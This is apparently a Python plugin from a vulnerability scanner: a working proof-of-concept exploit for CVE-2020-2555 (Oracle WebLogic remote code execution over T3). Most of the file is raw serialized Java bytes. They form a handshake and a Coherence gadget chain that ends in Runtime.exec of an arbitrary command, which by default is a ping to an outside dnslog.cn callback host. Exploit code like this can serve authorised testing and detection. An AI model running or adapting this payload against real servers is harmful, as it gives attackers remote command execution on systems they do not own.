#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2020-2555
# updated 2019/10/23
#

import pathlib
import socket
import sys
import time
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except:
    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return {
            'name': 'Oracle WebLogic Server Remote Code Execution',
            'catalog': 'CVE-2020-2555',
            'itype': PLUGIN_TYPE.POC,
            'protocols': ['t3'],
            'port': '7001',
        }

    def run(self, url: urlutil.Url, timeout=5, cmd='ping qxbooz.dnslog.cn', *args, **kwargs) -> Tuple[bool, Any]:
        # 对端响应数据需要一段时间，使用 delay 来控制，如果不成功，可以加到 3s 左右，超过这个基本都是打了补丁的
        try:
            self.tcp.connect()
        except socket.timeout:
            return False, 'connection timeout.'
        except ConnectionRefusedError:
            return False, 'connection refuse.'
        # t3 handshake
        err, _ = self.tcp.rq(b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n', timeout=timeout)

        # build t3 request object
        data = (
            b'''\x00\x00\x05\xc3\x01e\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00j\x00\x00\xea`\x00\x00\x00\x19\x00\x93{HJV\xfaJwvf\xf5\x81\xda\xa4\xf5\xb9\x0e*\xeb\xfc`t\x99\xb4\x02ysr\x00xr\x01xr\x02xp\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x06\x00pppppp\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x06\x00p\x06\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\x08I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitlet\x00\x12Ljava/lang/String;L\x00\nimplVendorq\x00~\x00\x03L\x00\x0bimplVersionq\x00~\x00\x03xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00$weblogic.common.internal.VersionInfo\x97"EQdRF>\x02\x00\x03[\x00\x08packagest\x00\'[Lweblogic/common/internal/PackageInfo;L\x00\x0ereleaseVersiont\x00\x12Ljava/lang/String;[\x00\x12versionInfoAsBytest\x00\x02[Bxr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\x08I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitleq\x00~\x00\x04L\x00\nimplVendorq\x00~\x00\x04L\x00\x0bimplVersionq\x00~\x00\x04xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00!weblogic.common.internal.PeerInfoXTt\xf3\x9b\xc9\x08\xf1\x02\x00\x06I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatch[\x00\x08packagest\x00\'[Lweblogic/common/internal/PackageInfo;xr\x00$weblogic.common.internal.VersionInfo\x97"EQdRF>\x02\x00\x03[\x00\x08packagesq\x00~\x00\x03L\x00\x0ereleaseVersiont\x00\x12Ljava/lang/String;[\x00\x12versionInfoAsBytest\x00\x02[Bxr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\x08I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitleq\x00~\x00\x05L\x00\nimplVendorq\x00~\x00\x05L\x00\x0bimplVersionq\x00~\x00\x05xpw\x02\x00\x00x\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpwP!\x00\x00\x00\x00\x00\x00\x00\x00\x00\r192.168.1.227\x00\x12WIN-AGDMVQUB1T6.eh\x834\x8c\xd6\x00\x00\x00\x07\x00\x00'''
            + url.i_port.to_bytes(2, 'big')
            + b'''\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xffx\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpw \x01\x14\xdcB\xbd\x07\x1aw'\x00\r242.214.1.254a\x86=\x1d\x00\x00\x00\x00x'''
        )
        err, _ = self.tcp.rq(data, timeout=-1)
        if err:
            return False, err

        # send evil object data
        data = b'\x05e\x08\x00\x00\x00\x01\x00\x00\x00\x1b\x00\x00\x00]\x01\x01\x00sr\x01xpsr\x02xp\x00\x00\x00\x00\x00\x00\x00\x00ur\x03xp\x00\x00\x00\x00xt\x00\x08weblogicur\x04xp\x00\x00\x00\x0c\x9c\x97\x9a\x9a\x8c\x9a\x9b\xcf\xcf\x9b\x93\x9at\x00\x08weblogic\x06\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00\x10java.util.Vector\xd9\x97}[\x80;\xaf\x01\x03\x00\x03I\x00\x11capacityIncrementI\x00\x0celementCount[\x00\x0belementDatat\x00\x13[Ljava/lang/Object;xpw\x02\x00\x00x\xfe\x01\x00\x00'
        # -------- attack code start --------
        data += (
            b'\xac\xed\x00\x05sr\x00.javax.management.BadAttributeValueExpException\xd4\xe7\xda\xabc-F@\x02\x00\x01L\x00\x03valt\x00\x12Ljava/lang/Object;xr\x00\x13java.lang.Exception\xd0\xfd\x1f>\x1a;\x1c\xc4\x02\x00\x00xr\x00\x13java.lang.Throwable\xd5\xc65\'9w\xb8\xcb\x03\x00\x04L\x00\x05causet\x00\x15Ljava/lang/Throwable;L\x00\rdetailMessaget\x00\x12Ljava/lang/String;[\x00\nstackTracet\x00\x1e[Ljava/lang/StackTraceElement;L\x00\x14suppressedExceptionst\x00\x10Ljava/util/List;xpq\x00~\x00\x08pur\x00\x1e[Ljava.lang.StackTraceElement;\x02F*<<\xfd"9\x02\x00\x00xp\x00\x00\x00\x03sr\x00\x1bjava.lang.StackTraceElementa\t\xc5\x9a&6\xdd\x85\x02\x00\x04I\x00\nlineNumberL\x00\x0edeclaringClassq\x00~\x00\x05L\x00\x08fileNameq\x00~\x00\x05L\x00\nmethodNameq\x00~\x00\x05xp\x00\x00\x00Ct\x00 ysoserial.payloads.CVE_2020_2555t\x00\x12CVE_2020_2555.javat\x00\tgetObjectsq\x00~\x00\x0b\x00\x00\x00\x01q\x00~\x00\rq\x00~\x00\x0eq\x00~\x00\x0fsq\x00~\x00\x0b\x00\x00\x00"t\x00\x19ysoserial.GeneratePayloadt\x00\x14GeneratePayload.javat\x00\x04mainsr\x00&java.util.Collections$UnmodifiableList\xfc\x0f%1\xb5\xec\x8e\x10\x02\x00\x01L\x00\x04listq\x00~\x00\x07xr\x00,java.util.Collections$UnmodifiableCollection\x19B\x00\x80\xcb^\xf7\x1e\x02\x00\x01L\x00\x01ct\x00\x16Ljava/util/Collection;xpsr\x00\x13java.util.ArrayListx\x81\xd2\x1d\x99\xc7a\x9d\x03\x00\x01I\x00\x04sizexp\x00\x00\x00\x00w\x04\x00\x00\x00\x00xq\x00~\x00\x1axsr\x00$com.tangosol.util.filter.LimitFilter\x99\x02%\x96\xd7\xb4YS\x02\x00\x06I\x00\x0bm_cPageSizeI\x00\x07m_nPageL\x00\x0cm_comparatort\x00\x16Ljava/util/Comparator;L\x00\x08m_filtert\x00\x1aLcom/tangosol/util/Filter;L\x00\x0fm_oAnchorBottomq\x00~\x00\x01L\x00\x0cm_oAnchorTopq\x00~\x00\x01xp\x00\x00\x00\x00\x00\x00\x00\x00sr\x00,com.tangosol.util.extractor.ChainedExtractor\x88\x9f\x81\xb0\x94][\x7f\x02\x00\x00xr\x006com.tangosol.util.extractor.AbstractCompositeExtractor\x08k=\x8c\x05i\x0fD\x02\x00\x01[\x00\x0cm_aExtractort\x00#[Lcom/tangosol/util/ValueExtractor;xr\x00-com.tangosol.util.extractor.AbstractExtractore\x81\x950>r8!\x02\x00\x01I\x00\tm_nTargetxp\x00\x00\x00\x00ur\x00#[Lcom.tangosol.util.ValueExtractor;"F G5\xc4\xa0\xfe\x02\x00\x00xp\x00\x00\x00\x04sr\x00-com.tangosol.util.extractor.IdentityExtractor\x93n\xe0\x80\xc7%\x9cK\x02\x00\x00xq\x00~\x00"\x00\x00\x00\x00sr\x00/com.tangosol.util.extractor.ReflectionExtractor\xeez\xe9\x95\xc0/\xb4\xa2\x02\x00\x02[\x00\tm_aoParamt\x00\x13[Ljava/lang/Object;L\x00\tm_sMethodq\x00~\x00\x05xq\x00~\x00"\x00\x00\x00\x00ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x02t\x00\ngetRuntimept\x00\tgetMethodsq\x00~\x00(\x00\x00\x00\x00uq\x00~\x00+\x00\x00\x00\x02ppt\x00\x06invokesq\x00~\x00(\x00\x00\x00\x00uq\x00~\x00+\x00\x00\x00\x01t'
            + (len(cmd) + 4).to_bytes(2, 'big')
            + cmd.encode()
            + b't\x00\x04execpvr\x00\x11java.lang.Runtime\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpp'
        )
        # --------- attack code end ---------
        data += b'\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00%weblogic.rjvm.ImmutableServiceContext\xdd\xcb\xa8pc\x86\xf0\xba\x0c\x00\x00xr\x00)weblogic.rmi.provider.BasicServiceContext\xe4c"6\xc5\xd4\xa7\x1e\x0c\x00\x00xpw\x02\x06\x00sr\x00&weblogic.rmi.internal.MethodDescriptor\x12HZ\x82\x8a\xf7\xf6{\x0c\x00\x00xpw4\x00.authenticate(Lweblogic.security.acl.UserInfo;)\x00\x00\x00\x1bxx\xfe\x00\xff'
        payload = '%s%s' % ('{:08x}'.format(len(data) // 2 + 4), data)

        payload = (len(data) + 4).to_bytes(4, 'big') + data
        err, b_response = self.tcp.rq(payload, timeout=timeout)
        if err:
            return False, err
        # 12.1.3
        b'\x00\x00\x06\xdd\x02e\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x8d\x00\x00\xea`\x00\x00\x00\x18v\x9e\x8bPQA\xd5M1\xa5>\xc7$wh\xd0\x08\x01\x81\x8c\x08g\x0f+\x02ysr\x00xr\x01xr\x02xp\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00pppppp\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00p\x04\x03\x00\x00\x00\x16\x00\x14t3://172.20.0.2:7001\x07\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00\x1bweblogic.rjvm.ClusterInfo90\xe6s\t\x1e\xe4S\x8e\xf7\x0c\x00\x00xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\tI\x00\x05majorI\x00\x05minorI\x00\x0bpatchUpdateI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitlet\x00\x12Ljava/lang/String;L\x00\nimplVendorq\x00~\x00\x03L\x00\x0bimplVersionq\x00~\x00\x03xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00$weblogic.common.internal.VersionInfo\x97"EQdRF>\x02\x00\x03[\x00\x08packagest\x00\'[Lweblogic/common/internal/PackageInfo;L\x00\x0ereleaseVersiont\x00\x12Ljava/lang/String;[\x00\x12versionInfoAsBytest\x00\x02[Bxr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\tI\x00\x05majorI\x00\x05minorI\x00\x0bpatchUpdateI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitleq\x00~\x00\x04L\x00\nimplVendorq\x00~\x00\x04L\x00\x0bimplVersionq\x00~\x00\x04xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00!weblogic.common.internal.PeerInfoXTt\xf3\x9b\xc9\x08\xf1\x02\x00\x07I\x00\x05majorI\x00\x05minorI\x00\x0bpatchUpdateI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatch[\x00\x08packagest\x00\'[Lweblogic/common/internal/PackageInfo;xr\x00$weblogic.common.internal.VersionInfo\x97"EQdRF>\x02\x00\x03[\x00\x08packagesq\x00~\x00\x03L\x00\x0ereleaseVersiont\x00\x12Ljava/lang/String;[\x00\x12versionInfoAsBytest\x00\x02[Bxr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\tI\x00\x05majorI\x00\x05minorI\x00\x0bpatchUpdateI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitleq\x00~\x00\x05L\x00\nimplVendorq\x00~\x00\x05L\x00\x0bimplVersionq\x00~\x00\x05xpw\x02\x00\x00x\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpwu\x03\x14\xdcB\xbd\x07\x1aw\'\x00\r242.214.1.254a\x86=\x1d\x00\x00\x00\x00\x19\xb0\x8a\x84\xa5\xcd\xa6\xb4r\x00\n172.20.0.2\xfcY\x05\xeb\x00\x00\x00\x07\x00\x00\x1bY\x00\x00\x1bY\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x0bbase_domain\x00\x0bAdminServer\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpwT\x19\xb0\x8a\x84\xa5\xcd\xa6\xb4r\x00\n172.20.0.2\xfcY\x05\xeb\x00\x00\x00\x07\x00\x00\x1bY\x00\x00\x1bY\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x0bbase_domain\x00\x0bAdminServer\x00x'

        # 10.0.6
        b'\x00\x00\x06\x9a\x02e\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x85\x00\x00\xea`\x00\x00\x00\x18)\xc0@\xa1\x84\x1a\x1f-\xf3\xb0\x1d\x0c9O\xcdSz\xaf:\x02\x8c\xbe\x95\x1a\x02ysr\x00xr\x01xr\x02xp\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x06\x00pppppp\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x06\x00p\x04\x03\x00\x00\x00\x16\x00\x14t3://172.18.0.3:7001\x07\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00\x1bweblogic.rjvm.ClusterInfo90\xe6s\t\x1e\xe4S\x8e\xf7\x0c\x00\x00xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\x08I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitlet\x00\x12Ljava/lang/String;L\x00\nimplVendorq\x00~\x00\x03L\x00\x0bimplVersionq\x00~\x00\x03xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00$weblogic.common.internal.VersionInfo\x97"EQdRF>\x02\x00\x03[\x00\x08packagest\x00\'[Lweblogic/common/internal/PackageInfo;L\x00\x0ereleaseVersiont\x00\x12Ljava/lang/String;[\x00\x12versionInfoAsBytest\x00\x02[Bxr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\x08I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitleq\x00~\x00\x04L\x00\nimplVendorq\x00~\x00\x04L\x00\x0bimplVersionq\x00~\x00\x04xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00!weblogic.common.internal.PeerInfoXTt\xf3\x9b\xc9\x08\xf1\x02\x00\x06I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatch[\x00\x08packagest\x00\'[Lweblogic/common/internal/PackageInfo;xr\x00$weblogic.common.internal.VersionInfo\x97"EQdRF>\x02\x00\x03[\x00\x08packagesq\x00~\x00\x03L\x00\x0ereleaseVersiont\x00\x12Ljava/lang/String;[\x00\x12versionInfoAsBytest\x00\x02[Bxr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\x08I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitleq\x00~\x00\x05L\x00\nimplVendorq\x00~\x00\x05L\x00\x0bimplVersionq\x00~\x00\x05xpw\x02\x00\x00x\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpws\x03\x14\xdcB\xbd\x07\x1aw\'\x00\r242.214.1.254a\x86=\x1d\x00\x00\x00\x00\x19_\x80\xc7H\x91Z\xb1N\x00\n172.18.0.3\x83\xb5yR\x00\x00\x00\x07\x00\x00\x1bY\x00\x00\x1bY\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x0bbase_domain\x00\x0bAdminServerx\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpwS\x19_\x80\xc7H\x91Z\xb1N\x00\n172.18.0.3\x83\xb5yR\x00\x00\x00\x07\x00\x00\x1bY\x00\x00\x1bY\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x0bbase_domain\x00\x0bAdminServerx'
        return b'weblogic.rjvm.ClusterInfo' in b_response, b_response


if __name__ == '__main__':
    import time

    from utils import net_echo

    nc = net_echo.DnslogCn()
    nc.start_service()
    plugin = Plugin(nc)

    s_time = time.time()
    ret = plugin.do_testing('192.168.245.128')
    print(ret)
    print(ret['is_exists'])
    print('total time(s):', time.time() - s_time)
